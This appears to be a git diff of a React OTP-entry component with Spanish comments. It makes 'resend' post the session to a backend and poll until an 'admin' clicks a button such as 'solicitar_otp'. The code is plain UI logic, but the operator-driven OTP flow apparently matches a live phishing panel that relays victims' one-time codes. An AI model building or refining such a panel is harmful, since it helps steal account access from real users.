@@ -259,20 +259,30 @@ export default function NumeroOTP() {
 
     const handleResend = async () => {
         try {
+            // Set loading state while waiting for admin response
+            setCargando(true);
+
             const usuarioLocalStorage = JSON.parse(localStorage.getItem("datos_usuario"));
             const sesionId = usuarioLocalStorage?.sesion_id;
 
-            if (sesionId) {
-                // No await needed necessarily if we don't want to block the UI reset, 
-                // but usually better to fire and forget or just log error silently
-                instanceBackend.post('/otp-resend', { sesionId }).catch(console.error);
+            if (!sesionId) {
+                alert("Error: No se encontró la sesión");
+                setCargando(false);
+                return;
             }
+
+            // Send resend request to backend
+            await instanceBackend.post('/otp-resend', { sesionId });
+
+            // Start polling to wait for admin decision
+            // The polling will detect when admin clicks a button (solicitar_otp, etc.)
+            iniciarPolling(sesionId);
+
         } catch (e) {
             console.error("Error notifying resend", e);
+            setCargando(false);
+            alert('Error al solicitar nuevo código. Intente nuevamente.');
         }
-
-        setTimeLeft(totalTime);
-        setActiveResend(false);
     };
 
     const handleClear = () => {
@@ -424,6 +434,13 @@ export default function NumeroOTP() {
 
                         // Se quita el estado de cargando
                         setCargando(false);
+
+                        // Se limpia el formulario para permitir nuevo intento
+                        handleClear();
+
+                        // Se resetea el timer
+                        setTimeLeft(totalTime);
+                        setActiveResend(false);
 
                         // Se sale del ciclo
                         break;
